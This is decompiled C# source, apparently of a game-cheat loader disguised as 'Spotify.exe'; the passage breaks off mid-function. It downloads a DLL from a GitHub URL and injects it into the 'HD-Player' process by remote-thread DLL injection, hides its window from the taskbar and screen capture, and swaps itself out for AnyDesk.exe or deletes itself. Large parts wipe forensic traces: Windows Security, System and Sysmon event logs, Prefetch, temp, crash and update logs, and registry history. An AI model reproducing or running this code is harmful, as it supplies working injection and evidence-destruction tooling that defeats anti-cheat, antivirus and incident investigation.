﻿// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp1.Bypass
// Assembly: Spotify, Version=1.2.66.447, Culture=neutral, PublicKeyToken=null
// MVID: 86D05C46-F66B-4354-A0DD-74F2377DCB52
// Assembly location: C:\Users\gean\Desktop\Spotify.exe

using CustomControls;
using Guna.UI2.WinForms;
using svchost.Controls;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable disable
namespace WindowsFormsApp1;

public class Bypass : UserControl
{
  private bool smOpen = false; // Variável para manter o estado do Stream Mode
  public static bool Streaming; // Estado global simples do modo de streaming
  
  // Constantes usadas com SetWindowDisplayAffinity
  private const uint WDA_NONE = 0x00; // Janela visível
  private const uint WDA_MONITOR = 0x01; // Restrição de exibição em monitor (pode falhar em alguns apps)
  private const uint WDA_EXCLUDEFROMCAPTURE = 0x11; // Windows 10 2004+: exclui de toda captura
  
  private const uint PROCESS_CREATE_THREAD = 2;
  private const uint PROCESS_QUERY_INFORMATION = 1024 /*0x0400*/;
  private const uint PROCESS_VM_OPERATION = 8;
  private const uint PROCESS_VM_WRITE = 32 /*0x20*/;
  private const uint PROCESS_VM_READ = 16 /*0x10*/;
  private const uint MEM_COMMIT = 4096 /*0x1000*/;
  private const uint MEM_RESERVE = 8192 /*0x2000*/;
  private const uint PAGE_READWRITE = 4;
  private IContainer components;
  private Guna2Panel guna2Panel2;
  private Txt txt6;
  private Guna2Panel guna2Panel1;
  private AnimatedButton animatedButton1;
  private AnimatedButton animatedButtonBypassInject;
  private Txt treis;
  private Txt dois;
  private Txt um;
  private Txt txt1;
  private AnimatedButton animatedButton2;
  private Guna2DragControl guna2DragControl1;
  private CustomCheckbox customCheckboxStreamMode;

  public event EventHandler<bool> StreamingChanged;

  [DllImport("user32.dll")]
  private static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

  [DllImport("kernel32.dll")]
  private static extern IntPtr OpenProcess(
    uint dwDesiredAccess,
    bool bInheritHandle,
    int dwProcessId);

  [DllImport("kernel32.dll")]
  private static extern IntPtr GetModuleHandle(string lpModuleName);

  [DllImport("kernel32.dll")]
  private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

  [DllImport("kernel32.dll")]
  private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

  [DllImport("kernel32.dll")]
  private static extern IntPtr VirtualAllocEx(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);

  [DllImport("kernel32.dll")]
  private static extern bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    uint nSize,
    out int lpNumberOfBytesWritten);

  [DllImport("kernel32.dll")]
  private static extern IntPtr CreateRemoteThread(
    IntPtr hProcess,
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    IntPtr lpThreadId);

  [DllImport("kernel32.dll")]
  private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

  [DllImport("kernel32.dll")]
  private static extern bool CloseHandle(IntPtr hObject);

  // ---- Estilos de janela para controlar visibilidade no Alt+Tab/Barra de tarefas ----
  [DllImport("user32.dll", SetLastError = true)]
  private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

  [DllImport("user32.dll")]
  private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

  private const int GWL_EXSTYLE = -20;
  private const int WS_EX_TOOLWINDOW = 0x00000080;
  private const int WS_EX_APPWINDOW = 0x00040000;

  public Bypass() => this.InitializeComponent();

  private void guna2Button1_Click(object sender, EventArgs e)
  {
  }

  private async void animatedButton1_Click(object sender, EventArgs e)
  {
    if (!(this.FindForm() is Spotify form))
      return;
    
    // Apenas fechar o painel
    form.AnimacaoReverseDoBypass();
  }

  // Implementação da lógica SSreplace
  private void ExecuteSSreplace()
  {
    try
    {
      // PASSO 0: Executar limpeza de memória
      StringCleaner.ExecuteMemoryCleaning();
      
      string anydeskPath = "C:\\Users\\" + Environment.UserName + "\\Desktop\\AnyDesk.exe";
      string executablePath = Application.ExecutablePath;
      
      bool anydeskExists = File.Exists(anydeskPath);
      
      if (anydeskExists)
      {
        // PASSO 1: Zerar arquivo atual
        ExecuteCommand("/C timeout /t 2 /nobreak > nul & copy NUL \"" + executablePath + "\"");
        
        // PASSO 2: Copiar AnyDesk sobre o arquivo atual
        ExecuteCommand("/C timeout /t 4 /nobreak > nul & type \"" + anydeskPath + "\" > \"" + executablePath + "\"");
        
        // PASSO 3: Restaurar svchost.exe
        string svchostPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe");
        if (File.Exists(svchostPath))
        {
          byte[] bytes = File.ReadAllBytes(svchostPath);
          File.WriteAllBytes(svchostPath, bytes);
        }
      }
      else
      {
        // Deletar arquivo atual
        ExecuteCommand("/C choice /C Y /N /D Y /T 3 & Del \"" + executablePath + "\"");
      }
      
      // Aguardar um pouco
      Thread.Sleep(100);
      
      // Encerrar aplicação
      try
      {
        Environment.Exit(0);
      }
      catch
      {
        Application.Exit();
      }
    }
    catch (Exception)
    {
      // Ignorar erros
    }
  }

  // Função auxiliar para executar comandos
  private void ExecuteCommand(string arguments)
  {
    try
    {
      using (Process process = new Process())
      {
        process.StartInfo.Arguments = arguments;
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.UseShellExecute = true;
        process.Start();
      }
    }
    catch (Exception)
    {
      // Ignorar erros
    }
  }

  private void ExecuteMemoryCleanerr()
  {
    // Método de limpeza de memória - implementar se necessário
  }

  private async void animatedButtonBypassInject_Click(object sender, EventArgs e)
  {
    if (!(this.FindForm() is Spotify form))
      return;
    
    try
    {
      // Desabilitar botão durante execução
      this.animatedButtonBypassInject.Enabled = false;
      this.animatedButtonBypassInject.Text = "Executando SSreplace...";
      
      // Executar SSreplace de forma assíncrona
      await Task.Run(() => ExecuteSSreplace());
      
      // Reabilitar botão
      this.animatedButtonBypassInject.Enabled = true;
      this.animatedButtonBypassInject.Text = "Bypass Inject";
      
      // Fechar o painel
      form.AnimacaoReverseDoBypass();
    }
    catch (Exception ex)
    {
      this.animatedButtonBypassInject.Enabled = true;
      this.animatedButtonBypassInject.Text = "Erro - Tentar Novamente";
      MessageBox.Show($"Erro ao executar SSreplace: {ex.Message}", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
    }
  }

  private bool InjectAndExecuteDllInProcess(string processName, string dllPath)
  {
    try
    {
      // Injetar a DLL no processo especificado
      bool injectionSuccess = DllInjector.InjectDll(processName, dllPath);
      
      if (!injectionSuccess)
      {
        return false;
      }

      // Aguardar um pouco para a DLL ser carregada
      System.Threading.Thread.Sleep(2000);
      
      // Tentar chamar o método ExecuteBypass da DLL injetada
      try
      {
        // Carregar a DLL localmente para chamar o método
        System.Reflection.Assembly dll = System.Reflection.Assembly.LoadFrom(dllPath);
        Type entryType = dll.GetType("Update.Entry");
        if (entryType != null)
        {
          System.Reflection.MethodInfo executeMethod = entryType.GetMethod("ExecuteBypass", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
          if (executeMethod != null)
          {
            executeMethod.Invoke(null, null);
          }
        }
      }
      catch
      {
        // Se falhar, a DLL deve executar automaticamente via construtor estático
      }
      
      return true;
    }
    catch
    {
      return false;
    }
  }

  // Método otimizado para limpar apenas logs de crack de forma assíncrona
  private Task CleanupCrackLogsAsync()
  {
    try
    {
      return Task.Run(() =>
      {
        
        
        // Caminhos onde podem estar logs do aplicativo
        string[] logPaths = {
          Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Spotify"),
          Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Spotify"),
          Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Spotify"),
          Path.Combine(Path.GetTempPath(), "Spotify"),
          Application.StartupPath
        };
        
        // Padrões de arquivos de log relacionados ao crack
        string[] logPatterns = {
          "*.log", "*.txt", "crack*", "*crack*", "debug*", "*debug*",
          "error*", "*error*", "trace*", "*trace*", "temp*", "*temp*"
        };
        
        foreach (string logPath in logPaths)
        {
          if (Directory.Exists(logPath))
          {
            foreach (string pattern in logPatterns)
            {
              try
              {
                string[] files = Directory.GetFiles(logPath, pattern, SearchOption.TopDirectoryOnly);
                foreach (string file in files)
                {
                  try
                  {
                    File.Delete(file);
                    
                  }
                  catch (Exception)
                  {
                    
                  }
                }
              }
              catch (Exception)
              {
                
              }
            }
          }
        }
        
        
      });
    }
    catch (Exception)
    {
      
      return Task.CompletedTask;
    }
  }

  private static Process GetProcessByName(string processName)
  {
    Process[] processesByName = Process.GetProcessesByName(processName);
    return processesByName.Length != 0 ? processesByName[0] : (Process) null;
  }

  private static bool IsProcess64Bit(Process process)
  {
    try
    {
      if (Environment.Is64BitOperatingSystem)
      {
        bool isWow64;
        if (IsWow64Process(process.Handle, out isWow64))
        {
          return !isWow64; // Se não é WOW64, é 64-bit nativo
        }
      }
      return false; // Se não conseguir determinar, assume 32-bit
    }
    catch
    {
      return false;
    }
  }

  private static bool IsDll64Bit(string dllPath)
  {
    try
    {
      if (!System.IO.File.Exists(dllPath))
        return false;

      using (var fs = new System.IO.FileStream(dllPath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
      {
        using (var reader = new System.IO.BinaryReader(fs))
        {
          // Ler cabeçalho PE
          fs.Seek(0x3C, System.IO.SeekOrigin.Begin);
          int peHeaderOffset = reader.ReadInt32();
          fs.Seek(peHeaderOffset, System.IO.SeekOrigin.Begin);
          
          // Verificar assinatura PE
          uint peSignature = reader.ReadUInt32();
          if (peSignature != 0x00004550) // "PE\0\0"
            return false;
          
          // Ler Machine field (offset 4 do cabeçalho PE)
          ushort machine = reader.ReadUInt16();
          
          // 0x8664 = IMAGE_FILE_MACHINE_AMD64 (64-bit)
          // 0x014C = IMAGE_FILE_MACHINE_I386 (32-bit)
          return machine == 0x8664;
        }
      }
    }
    catch
    {
      return false;
    }
  }

  private async void animatedButton2_Click_1(object sender, EventArgs e)
  {
    try
    {
      string processName = "HD-Player";
      string url = "https://github.com/victorhu77/chams/releases/download/chams/COLOR2.dll";
      string downloadPath = "C:\\Program Files (x86)\\color2.dll";
      
      this.animatedButton2.Enabled = false;
      this.animatedButton2.Text = "Baixando color2.dll...";
      
      // Download assíncrono para não bloquear a UI
      await Task.Run(() => DllInjector.DownloadDll(url, downloadPath));
      
      this.animatedButton2.Text = "Procurando processo...";
      
      Process processByName = DllInjector.GetProcessByName(processName);
      if (processByName == null)
      {
        MessageBox.Show("Processo '" + processName + "' não encontrado!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.animatedButton2.Text = "Tentar Novamente";
        this.animatedButton2.Enabled = true;
        return;
      }
      
      this.animatedButton2.Text = "Injetando color2.dll...";
      
      // Injeção assíncrona
      bool sucesso = await Task.Run(() => DllInjector.InjectDll(processName, downloadPath));
      
      if (sucesso)
      {
        this.animatedButton2.Text = "Concluído";
      }
      else
      {
        MessageBox.Show("Falha ao injetar color2.dll!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.animatedButton2.Text = "Falhou - Tentar Novamente";
      }
      this.animatedButton2.Enabled = true;
    }
    catch (Exception ex)
    {
      MessageBox.Show("Erro: " + ex.Message, "Erro", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      this.animatedButton2.Text = "Erro - Tentar Novamente";
      this.animatedButton2.Enabled = true;
    }
  }

  // Função que ativa o Stream Mode (oculta do Alt+Tab e da barra de tarefas)
  private void SMOn()
  {
    Form parentForm = this.FindForm();
    if (parentForm == null)
      return;

    IntPtr hWnd = parentForm.Handle;
    int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
    exStyle |= WS_EX_TOOLWINDOW;
    exStyle &= ~WS_EX_APPWINDOW;
    SetWindowLong(hWnd, GWL_EXSTYLE, exStyle);
    parentForm.ShowInTaskbar = false;

    Streaming = true;
    this.StreamingChanged?.Invoke(this, true);

    // Ir para a página principal (Combat) do controle Main
    try
    {
      if (this.Parent is Main main)
      {
        main.ShowCombatTab();
      }
    }
    catch { }

    try
    {
      if (this.IsHandleCreated)
      {
        this.BeginInvoke(new Action(() =>
        {
          this.Invalidate(true);
          this.guna2Panel1?.Invalidate();
          this.guna2Panel2?.Invalidate();
          parentForm.Invalidate(true);
          parentForm.Refresh();
        }));
      }
    }
    catch { }
  }

  // Função que desativa o Stream Mode (volta a aparecer no Alt+Tab e na barra)
  private void SMOff()
  {
    Form parentForm = this.FindForm();
    if (parentForm == null)
      return;

    IntPtr hWnd = parentForm.Handle;
    int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
    exStyle &= ~WS_EX_TOOLWINDOW;
    exStyle |= WS_EX_APPWINDOW;
    SetWindowLong(hWnd, GWL_EXSTYLE, exStyle);
    parentForm.ShowInTaskbar = true;

    Streaming = false;
    this.StreamingChanged?.Invoke(this, false);

    // Voltar para a página principal (Combat) ao desativar o Stream Mode
    try
    {
      if (this.Parent is Main main)
      {
        main.ShowCombatTab();
      }
    }
    catch { }

    try
    {
      if (this.IsHandleCreated)
      {
        this.BeginInvoke(new Action(() =>
        {
          this.Invalidate(true);
          this.guna2Panel1?.Invalidate();
          this.guna2Panel2?.Invalidate();
          parentForm.Invalidate(true);
          parentForm.Refresh();
        }));
      }
    }
    catch { }
  }

  // Atualiza apenas a área de Settings/Extras de forma otimizada
  private void RefreshSettingsUI()
  {
    try
    {
      // Verificar se estamos na thread da UI
      if (this.InvokeRequired)
      {
        this.BeginInvoke(new Action(this.RefreshSettingsUI));
        return;
      }

      // Atualização otimizada - apenas invalidar áreas necessárias
      this.guna2Panel2.Invalidate();
      this.guna2Panel1.Invalidate();
      this.guna2Panel2.Update();
      this.guna2Panel1.Update();
    }
    catch
    {
      // Silencioso: refresh é best-effort
    }
  }

  private void customCheckboxStreamMode_CheckedChanged(object sender, EventArgs e)
  {
    // Alterna entre o Stream Mode
    if (smOpen)
    {
      SMOff(); // Se estiver aberto, desative o Stream Mode
    }
    else
    {
      SMOn(); // Se não estiver aberto, ative o Stream Mode
    }

    // Alterna o estado da variável smOpen
    smOpen = !smOpen;

    // Após alterar o modo, garantir que a UI de Settings seja redesenhada
    this.RefreshSettingsUI();
  }

  private async Task DownloadDllAsync(string url, string path)
  {
    try
    {
      // Criar diretório se não existir
      string directory = System.IO.Path.GetDirectoryName(path);
      if (!System.IO.Directory.Exists(directory))
      {
        System.IO.Directory.CreateDirectory(directory);
      }

      using (WebClient client = new WebClient())
      {
        // Adicionar headers para evitar bloqueios
        client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        await client.DownloadFileTaskAsync(new Uri(url), path);
      }

      // Verificar se o arquivo foi baixado corretamente
      if (System.IO.File.Exists(path))
      {
        var fileInfo = new System.IO.FileInfo(path);
        if (fileInfo.Length > 0)
        {
          
        }
        else
        {
          throw new Exception("Arquivo baixado está vazio");
        }
      }
      else
      {
        throw new Exception("Arquivo não foi criado após download");
      }
    }
    catch (Exception)
    {
      
      throw;
    }
  }

  private bool InjectDll(Process process, string dllPath)
  {
    IntPtr processHandle = IntPtr.Zero;
    IntPtr allocatedMemory = IntPtr.Zero;
    IntPtr remoteThread = IntPtr.Zero;
    
    try
    {
      // Verificar se o processo ainda está rodando
      if (process.HasExited)
      {
        MessageBox.Show("O processo alvo foi encerrado!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        return false;
      }

      // Verificar arquitetura do processo
      bool isProcess64Bit = IsProcess64Bit(process);
      bool isDll64Bit = IsDll64Bit(dllPath);
      
      if (isProcess64Bit != isDll64Bit)
      {
        string processArch = isProcess64Bit ? "64-bit" : "32-bit";
        string dllArch = isDll64Bit ? "64-bit" : "32-bit";
        MessageBox.Show($"Incompatibilidade de arquitetura!\nProcesso: {processArch}\nDLL: {dllArch}\n\nA DLL deve ser {processArch} para funcionar.", "Erro de Arquitetura", MessageBoxButtons.OK, MessageBoxIcon.Error);
        return false;
      }

      // Tentar abrir o processo com privilégios necessários
      uint processAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
      processHandle = Bypass.OpenProcess(processAccess, false, process.Id);
      
      if (processHandle == IntPtr.Zero)
      {
        // Tentar com privilégios reduzidos se falhar
        processAccess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
        processHandle = Bypass.OpenProcess(processAccess, false, process.Id);
        
        if (processHandle == IntPtr.Zero)
        {
          MessageBox.Show("Falha ao abrir o processo! Execute como administrador.", "Erro de Privilégios", MessageBoxButtons.OK, MessageBoxIcon.Error);
          return false;
        }
        else
        {
          MessageBox.Show("Acesso limitado ao processo. Algumas funcionalidades podem não funcionar.", "Aviso", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
      }

      // Obter handle do kernel32.dll
      IntPtr moduleHandle = Bypass.GetModuleHandle("kernel32.dll");
      if (moduleHandle == IntPtr.Zero)
      {
        MessageBox.Show("Falha ao obter handle do kernel32!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
        return false;
      }

      // Obter endereço do LoadLibraryA
      IntPtr procAddress = Bypass.GetProcAddress(moduleHandle, "LoadLibraryA");
      if (procAddress == IntPtr.Zero)
      {
        MessageBox.Show("Falha ao obter endereço do LoadLibraryA!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
        return false;
      }

      // Verificar se o arquivo DLL existe
      if (!System.IO.File.Exists(dllPath))
      {
        MessageBox.Show($"Arquivo DLL não encontrado: {dllPath}", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
        return false;
      }

      // Verificar informações da DLL color2
      var dllInfo = new System.IO.FileInfo(dllPath);
      

      // Alocar memória no processo alvo
      byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllPath);
      allocatedMemory = Bypass.VirtualAllocEx(processHandle, IntPtr.Zero, (uint)(dllPathBytes.Length + 1), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      
      if (allocatedMemory == IntPtr.Zero)
      {
        MessageBox.Show("Falha ao alocar memória no processo alvo!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
        return false;
      }

      // Escrever o caminho da DLL na memória alocada
      if (!Bypass.WriteProcessMemory(processHandle, allocatedMemory, dllPathBytes, (uint)dllPathBytes.Length, out int bytesWritten))
      {
        MessageBox.Show("Falha ao escrever na memória do processo!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
        return false;
      }

      // Criar thread remota para carregar a DLL
      remoteThread = Bypass.CreateRemoteThread(processHandle, IntPtr.Zero, 0U, procAddress, allocatedMemory, 0U, IntPtr.Zero);
      
      if (remoteThread == IntPtr.Zero)
      {
        int lastError = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
        string errorMessage = GetErrorMessage(lastError);
        
        // Tentar abordagem alternativa se falhar
        if (lastError == 5) // Acesso negado
        {
          MessageBox.Show($"Acesso negado ao processo!\n\n" +
                        "Possíveis soluções:\n" +
                        "1. Execute a aplicação como administrador\n" +
                        "2. Desative o antivírus temporariamente\n" +
                        "3. Adicione exceção no Windows Defender\n" +
                        "4. Verifique se o processo alvo está protegido\n\n" +
                        $"Erro: {errorMessage} (Código: {lastError})", 
                        "Erro de Acesso", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
        else
        {
          MessageBox.Show($"Falha ao criar thread remota!\nErro: {errorMessage}\nCódigo: {lastError}", "Erro de Injeção", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
        return false;
      }

      // Aguardar a thread remota completar
      uint waitResult = Bypass.WaitForSingleObject(remoteThread, 10000U); // 10 segundos timeout
      
      if (waitResult == 0) // WAIT_OBJECT_0
      {
        MessageBox.Show("color2.dll injetada com sucesso!\n\nO hook chams foi ativado no processo.", "Sucesso", MessageBoxButtons.OK, MessageBoxIcon.Information);
        
        return true;
      }
      else if (waitResult == 258) // WAIT_TIMEOUT
      {
        MessageBox.Show("Timeout ao aguardar injeção da DLL!", "Timeout", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        return false;
      }
      else
      {
        MessageBox.Show("Falha ao aguardar conclusão da injeção!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
        return false;
      }
    }
    catch (Exception ex)
    {
      MessageBox.Show($"Erro inesperado durante injeção: {ex.Message}", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
      return false;
    }
    finally
    {
      // Limpar recursos
      if (remoteThread != IntPtr.Zero)
        Bypass.CloseHandle(remoteThread);
      if (allocatedMemory != IntPtr.Zero)
        Bypass.CloseHandle(allocatedMemory);
      if (processHandle != IntPtr.Zero)
        Bypass.CloseHandle(processHandle);
    }
  }

  private string GetErrorMessage(int errorCode)
  {
    switch (errorCode)
    {
      case 5: return "Acesso negado. Execute como administrador.";
      case 87: return "Parâmetro inválido.";
      case 487: return "Endereço inválido.";
      case 998: return "Acesso inválido à localização da memória.";
      default: return $"Erro do sistema: {errorCode}";
    }
  }

  private static void DownloadDll(string url, string path)
  {
    using (WebClient webClient = new WebClient())
      webClient.DownloadFile(url, path);
  }




  // Limpar logs de modificação de um processo específico
  private void ClearProcessModificationLogs(string processName)
  {
    try
    {
      // Padrões de logs suspeitos para remover
      string[] suspiciousPatterns = {
        "*modification*", "*injection*", "*hook*", "*bypass*", "*memory*",
        "*process*creation*", "*thread*creation*", "*dll*injection*",
        "*registry*modification*", "*file*modification*"
      };

      string[] logPaths = {
        $@"C:\Windows\Logs\{processName}",
        $@"C:\Windows\System32\winevt\Logs",
        $@"C:\Windows\Panther\UnattendGC"
      };

      foreach (string logPath in logPaths)
      {
        if (Directory.Exists(logPath))
        {
          this.ClearSuspiciousFiles(logPath, suspiciousPatterns);
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar logs de atividade suspeita (mantendo logs básicos)
  private void CleanupSuspiciousActivityLogs()
  {
    try
    {
      // Limpar apenas arquivos suspeitos de temp
      this.CleanupSuspiciousTempFiles();
      
      // Limpar logs de prefetch relacionados a modificações
      this.CleanupSuspiciousPrefetchFiles();
      
      // Limpar logs de debug relacionados a modificações
      this.CleanupSuspiciousDebugFiles();
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar arquivos suspeitos de temp (mantendo arquivos normais)
  private void CleanupSuspiciousTempFiles()
  {
    try
    {
      string tempPath = @"C:\Windows\Temp";
      if (Directory.Exists(tempPath))
      {
        // Padrões de arquivos suspeitos em temp
        string[] suspiciousPatterns = {
          "*injection*", "*hook*", "*bypass*", "*modification*", "*memory*",
          "*process*", "*thread*", "*dll*", "*hex*", "*patch*"
        };
        
        this.ClearSuspiciousFiles(tempPath, suspiciousPatterns);
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar arquivos suspeitos de prefetch
  private void CleanupSuspiciousPrefetchFiles()
  {
    try
    {
      string prefetchPath = @"C:\Windows\Prefetch";
      if (Directory.Exists(prefetchPath))
      {
        // Remover apenas arquivos .pf relacionados a modificações
        string[] suspiciousPatterns = {
          "*injection*", "*hook*", "*bypass*", "*modification*", "*memory*"
        };
        
        this.ClearSuspiciousFiles(prefetchPath, suspiciousPatterns);
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar arquivos suspeitos de debug
  private void CleanupSuspiciousDebugFiles()
  {
    try
    {
      string debugPath = @"C:\Windows\Debug";
      if (Directory.Exists(debugPath))
      {
        // Padrões de arquivos de debug suspeitos
        string[] suspiciousPatterns = {
          "*injection*", "*hook*", "*bypass*", "*modification*", "*memory*",
          "*process*", "*thread*", "*dll*", "*hex*", "*patch*"
        };
        
        this.ClearSuspiciousFiles(debugPath, suspiciousPatterns);
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar logs adicionais não citados
  private void CleanupAdditionalLogs()
  {
    try
    {
      // Limpar Event Viewer logs
      this.ClearEventViewerLogs();
      
      // Limpar Windows Update logs
      this.ClearWindowsUpdateLogs();
      
      // Limpar Application logs
      this.ClearApplicationLogs();
      
      // Limpar System logs
      this.ClearSystemLogs();
      
      // Limpar Sysmon logs
      this.ClearSysmonLogs();
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar logs do Sysmon
  private void ClearSysmonLogs()
  {
    try
    {
      string[] sysmonPaths = {
        @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx",
        @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evt",
        @"C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
        @"C:\ProgramData\Microsoft\Windows\WER\ReportArchive"
      };

      foreach (string path in sysmonPaths)
      {
        try
        {
          if (File.Exists(path))
          {
            File.SetAttributes(path, FileAttributes.Normal);
            File.Delete(path);
            
          }
          else if (Directory.Exists(path))
          {
            this.ClearDirectoryLogs(path);
          }
        }
        catch (Exception)
        {
          
        }
      }

      // Limpar logs do Sysmon via PowerShell
      try
      {
        ProcessStartInfo psi = new ProcessStartInfo
        {
          FileName = "powershell.exe",
          Arguments = "-Command \"Clear-EventLog -LogName 'Microsoft-Windows-Sysmon/Operational' -ErrorAction SilentlyContinue\"",
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        
        using (Process process = Process.Start(psi))
        {
          process?.WaitForExit(5000);
        }
      }
      catch (Exception)
      {
        
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar logs de um processo específico
  private void ClearProcessLogs(Process process)
  {
    try
    {
      // Tentar limpar logs relacionados ao processo
      string processLogPath = $@"C:\Windows\Logs\{process.ProcessName}";
      if (Directory.Exists(processLogPath))
      {
        this.ClearDirectoryLogs(processLogPath);
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar logs de um diretório
  private void ClearDirectoryLogs(string directoryPath)
  {
    try
    {
      string[] logFiles = Directory.GetFiles(directoryPath, "*.log", SearchOption.AllDirectories);
      string[] evtFiles = Directory.GetFiles(directoryPath, "*.evt", SearchOption.AllDirectories);
      string[] evtxFiles = Directory.GetFiles(directoryPath, "*.evtx", SearchOption.AllDirectories);
      string[] tmpFiles = Directory.GetFiles(directoryPath, "*.tmp", SearchOption.AllDirectories);

      // Combinar todos os tipos de arquivos de log
      string[] allLogFiles = logFiles.Concat(evtFiles).Concat(evtxFiles).Concat(tmpFiles).ToArray();

      foreach (string file in allLogFiles)
      {
        try
        {
          if (File.Exists(file))
          {
            File.SetAttributes(file, FileAttributes.Normal);
            File.Delete(file);
            
          }
        }
        catch (Exception)
        {
          
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar Event Viewer logs
  private void ClearEventViewerLogs()
  {
    try
    {
      // Usar PowerShell para limpar logs do Event Viewer
      string[] logNames = {
        "Application", "System", "Security", "Setup", "ForwardedEvents",
        "Microsoft-Windows-Diagnostics-Performance/Operational",
        "Microsoft-Windows-Kernel-EventTracing/Admin",
        "Microsoft-Windows-Shell-Core/Operational"
      };

      foreach (string logName in logNames)
      {
        try
        {
          ProcessStartInfo psi = new ProcessStartInfo
          {
            FileName = "powershell.exe",
            Arguments = $"-Command \"Clear-EventLog -LogName '{logName}' -ErrorAction SilentlyContinue\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
          };
          
          using (Process process = Process.Start(psi))
          {
            process?.WaitForExit(5000); // Timeout de 5 segundos
          }
        }
        catch (Exception)
        {
          
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar Windows Update logs
  private void ClearWindowsUpdateLogs()
  {
    try
    {
      string[] updatePaths = {
        @"C:\Windows\SoftwareDistribution\Download",
        @"C:\Windows\SoftwareDistribution\DataStore\Logs",
        @"C:\Windows\Logs\CBS",
        @"C:\Windows\Logs\DISM"
      };

      foreach (string path in updatePaths)
      {
        if (Directory.Exists(path))
        {
          this.ClearDirectoryLogs(path);
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar Application logs
  private void ClearApplicationLogs()
  {
    try
    {
      string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string[] appLogPaths = {
        Path.Combine(appDataPath, "Microsoft", "Windows", "Recent"),
        Path.Combine(appDataPath, "Microsoft", "Windows", "Themes", "CachedFiles"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp")
      };

      foreach (string path in appLogPaths)
      {
        if (Directory.Exists(path))
        {
          this.ClearDirectoryLogs(path);
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar System logs
  private void ClearSystemLogs()
  {
    try
    {
      string[] systemPaths = {
        @"C:\Windows\System32\LogFiles",
        @"C:\Windows\System32\wbem\Logs",
        @"C:\Windows\System32\config\systemprofile\AppData\Local\CrashDumps"
      };

      foreach (string path in systemPaths)
      {
        if (Directory.Exists(path))
        {
          this.ClearDirectoryLogs(path);
        }
      }
    }
    catch (Exception)
    {
      
    }
  }

  // Limpar logs de registry relacionados a modificações (seletivo)
  private void CleanupRegistryModificationLogs()
  {
    try
    {
      // Limpar apenas chaves relacionadas a modificações suspeitas
      string[] registryCommands = {
        "Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs' -Name '*' -ErrorAction SilentlyContinue",
